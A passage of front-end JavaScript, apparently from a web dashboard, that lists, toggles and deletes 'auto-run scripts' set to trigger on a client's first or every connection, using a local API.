    const res = await fetch("/api/scripts/autorun");
    if (!res.ok) throw new Error();
    const scripts = await res.json();
    if (!Array.isArray(scripts) || scripts.length === 0) {
      autorunList.innerHTML = '<div class="empty-state" style="padding:.5rem;">No auto-run scripts yet.</div>';
      return;
    }
    autorunList.innerHTML = scripts.map(s => {
      const isFirstConnect = s.trigger === "on_first_connect";
      const trigLabel = isFirstConnect ? "First Connect" : "Every Connect";
      const trigColor = isFirstConnect ? "rgba(139,92,246,.5)" : "rgba(34,211,238,.4)";
      return `<div class="item-row">
        <div style="flex:1;min-width:0;">
          <div class="item-name" style="display:flex;align-items:center;gap:.35rem;flex-wrap:wrap;">
            ${escapeHtml(s.name)}
            <span style="font-size:.63rem;padding:.08rem .36rem;border-radius:5px;border:1px solid ${trigColor};color:#c0e8ff;background:rgba(0,0,0,.2);">${escapeHtml(trigLabel)}</span>
            <span style="font-size:.63rem;padding:.08rem .36rem;border-radius:5px;border:1px solid ${s.enabled ? "rgba(74,222,128,.4)" : "rgba(148,163,184,.25)"};color:${s.enabled ? "#4ade80" : "#64748b"};background:rgba(0,0,0,.2);">${s.enabled ? "Active" : "Disabled"}</span>
          </div>
          <div class="item-meta">${escapeHtml(s.type)}</div>
        </div>
        <div class="item-actions">
          <button class="btn btn-ghost btn-sm ar-toggle" data-id="${escapeHtml(s.id)}" data-enabled="${s.enabled}" title="${s.enabled ? "Disable" : "Enable"}">${s.enabled ? "Disable" : "Enable"}</button>
          <button class="btn btn-danger btn-sm ar-delete" data-id="${escapeHtml(s.id)}" title="Delete"><i class="fa-solid fa-trash"></i></button>
        </div>
      </div>`;
    }).join("");

    autorunList.querySelectorAll(".ar-toggle").forEach(btn => {
      btn.addEventListener("click", async () => {
        const id = btn.dataset.id;
        const enabled = btn.dataset.enabled === "true";
        try {
          await fetch(`/api/scripts/autorun/${id}`, {
            method: "PUT",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ enabled: !enabled }),
          });
          renderAutorunScripts();
        } catch { showToast("Update failed", "error", 3000); }
      });
    });

    autorunList.querySelectorAll(".ar-delete").forEach(btn => {
      btn.addEventListener("click", async () => {
        if (!confirm("Delete this auto-run script?")) return;
        try {
          await fetch(`/api/scripts/autorun/${btn.dataset.id}`, { method: "DELETE" });
          showToast("Auto-run script deleted", "success", 3000);
          renderAutorunScripts();
        } catch { showToast("Delete failed", "error", 3000); }
      });
    });
  } catch {
    autorunList.innerHTML = '<div class="empty-state" style="padding:.5rem;color:#f87171;">Failed to load.</div>';
  }
}

renderAutorunScripts();
